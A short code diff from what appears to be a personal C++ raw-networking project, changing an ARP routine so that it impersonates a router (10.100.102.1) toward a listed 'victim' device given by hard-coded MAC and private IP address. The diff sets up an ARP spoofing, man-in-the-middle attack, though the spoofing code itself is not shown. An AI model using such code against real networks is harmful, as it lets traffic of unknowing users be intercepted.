@@ -1,5 +1,6 @@
 #include <iostream>
 #include <vector>
+#include <linux/if_ether.h>
 
 #include "linux/tcp/tcp_conn_client.h"
 #include "linux/udp/udp_conn_client.h"
@@ -137,12 +138,20 @@ int icmp_main() {
 }
 
 int arp_main() {
-//    arp_conn_client arp_client;
-//    arp_client.init();
 
-    ethernet_conn_client ether_client("");
-    ether_client.init();
-    ether_client.spoof();
+    ethernet_conn_client ether_client;
+
+    arp_conn_client arp_client;
+    arp_client.ether_client = &ether_client;
+
+
+    vector<pair<mac_addr, string>> victim_list = {
+            {{0x20, 0x7b, 0xd2, 0xaf, 0xdb, 0xc9}, "10.100.102.15"}
+    };
+    arp_client.spoof_as_device("10.100.102.1", // router
+                               victim_list);
+//    ether_client.spoof();
+
 }
 
 int main() {
